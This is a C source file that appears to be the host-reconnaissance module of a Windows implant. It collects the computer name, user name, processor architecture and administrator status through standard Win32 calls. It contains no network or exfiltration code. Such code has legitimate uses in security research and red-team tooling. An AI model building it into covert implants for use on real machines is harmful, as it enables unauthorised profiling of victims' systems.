#include "system.h"

//Get all system information
AllSI_t GetAllSystemInformation()
{
	AllSI_t sysInfo = { 0 };
	sysInfo.architecture = GetCompArchitecture();
	sysInfo.computerName = GetCompName();
	sysInfo.userName = GetUsername();
	sysInfo.admin = GetPriv();

	return sysInfo;
}

//Get computer name
WCHAR* GetCompName()
{
	DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
	WCHAR* infoBuf = (WCHAR*)ImplantHeapAlloc(size * sizeof(WCHAR));
	if (GetComputerNameW(infoBuf, &size) == 0)
	{
		return NULL;
	}
	return infoBuf;
	

}
//Get user name
WCHAR* GetUsername()
{
	DWORD size = UNLEN + 1;
	WCHAR* infoBuf = (WCHAR*)ImplantHeapAlloc(size * sizeof(WCHAR));
	if (GetUserNameW(infoBuf, &size) == 0)
	{
		return NULL;
	}
	return infoBuf;
}

//Get privelege level, where True means admin
//GOT THIS FROM MICROSOFT HELP PAGE!!
BOOL GetPriv()
{
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;
	b = AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&AdministratorsGroup);

	if (b)
	{
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &b))
		{
			b = FALSE;
		}
		FreeSid(AdministratorsGroup);
	}

	return(b);
}

//Get computer architecture
	PWSTR GetCompArchitecture()
{
	PWSTR arch = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 32 * sizeof(WCHAR));

	SYSTEM_INFO si = { 0 };
	GetSystemInfo(&si);
	switch (si.wProcessorArchitecture)
	{
	case PROCESSOR_ARCHITECTURE_AMD64:
		wcscpy_s(arch, 32, L"x64 (AMD or Intel)");
		break;
	case PROCESSOR_ARCHITECTURE_INTEL:
		wcscpy_s(arch, 32, L"x86");
		break;
	case PROCESSOR_ARCHITECTURE_ARM:
	case PROCESSOR_ARCHITECTURE_ARM64
		:
		wcscpy_s(arch, 32, L"ARM or ARM64");
		break;
	case PROCESSOR_ARCHITECTURE_IA64:
		wcscpy_s(arch, 32, L"IA64");
		break;
	default:
		wcscpy_s(arch, 32, L"UNKNOWN");
	}
	return arch;
}
